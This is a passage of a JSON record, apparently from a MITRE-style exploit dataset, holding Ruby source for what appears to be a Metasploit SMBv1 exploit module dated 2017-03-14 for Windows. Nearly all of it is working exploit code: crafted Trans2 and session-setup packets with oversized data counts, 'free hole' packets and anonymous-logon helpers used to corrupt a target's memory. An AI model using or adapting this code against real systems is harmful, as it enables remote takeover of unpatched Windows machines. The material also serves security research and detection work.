here.\n    packet.data_block.enable_padding = false\n\n    packet = set_smb1_headers(packet, tree_id, user_id)\n\n    packet.parameter_block.max_setup_count = 1\n    packet.parameter_block.total_parameter_count = 30\n    packet.parameter_block.total_data_count = 66512\n    packet.parameter_block.max_parameter_count = 30\n    packet.parameter_block.max_data_count = 0\n    packet.parameter_block.parameter_count = 30\n    packet.parameter_block.parameter_offset = 75\n    packet.parameter_block.data_count = 976\n    packet.parameter_block.data_offset = 104\n    packet.parameter_block.function = 0\n\n    packet.parameter_block.setup << 0x0000\n\n    packet.data_block.byte_count = 1004\n    packet.data_block.trans2_parameters = \"\\x00\" * 31 + \"\\x01\" + (\"\\x00\" * 973)\n    packet\n  end\n\n  def make_smb1_free_hole_session_packet(flags2, vcnum, native_os)\n    packet = RubySMB::SMB1::Packet::SessionSetupRequest.new\n\n    packet.smb_header.flags.read(\"\\x18\")\n    packet.smb_header.flags2.read(flags2)\n    packet.smb_header.pid_high = 65279\n    packet.smb_header.mid = 64\n\n    packet.parameter_block.vc_number.read(vcnum)\n    packet.parameter_block.max_buffer_size = 4356\n    packet.parameter_block.max_mpx_count = 10\n    packet.parameter_block.security_blob_length = 0\n\n    packet.smb_header.flags2.unicode = 0\n    packet.data_block.security_blob = native_os + \"\\x00\" * 15\n    packet.data_block.native_os = ''\n    packet.data_block.native_lan_man = ''\n    packet\n  end\n\n  # Sets common SMB1 Header values used by the various\n  # packets in the exploit.\n  #\n  # @return [RubySMB::GenericPacket] the modified version of the packet\n  def set_smb1_headers(packet, tree_id, user_id)\n    packet.smb_header.flags2.read(\"\\x07\\xc0\")\n    packet.smb_header.tid = tree_id\n    packet.smb_header.uid = user_id\n    packet.smb_header.pid_low = 65279\n    packet.smb_header.mid = 64\n    packet\n  end\n\n  # Returns the value to be passed to SMB clients for\n  # the password. If the user has not supplied a password\n  # it returns an empty string to trigger an anonymous\n  # logon.\n  #\n  # @return [String] the password value\n  def smb_pass\n    if datastore['SMBPass'].present?\n      datastore['SMBPass']\n    else\n      ''\n    end\n  end\n\n  # Returns the value to be passed to SMB clients for\n  # the username. If the user has not supplied a username\n  # it returns an empty string to trigger an anonymous\n  # logon.\n  #\n  # @return [String] the username value\n  def smb_user\n    if datastore['SMBUser'].present?\n      datastore['SMBUser']\n    else\n      ''\n    end\n  end\n\n  # Returns the value to be passed to SMB clients for\n  # the domain. If the user has not supplied a domain\n  # it returns an empty string to trigger an anonymous\n  # logon.\n  #\n  # @return [String] the domain value\n  def smb_domain\n    if datastore['SMBDomain'].present?\n      datastore['SMBDomain']\n    else\n      ''\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-14",
    "x_mitre_platforms": [
        "win'"
    ]
}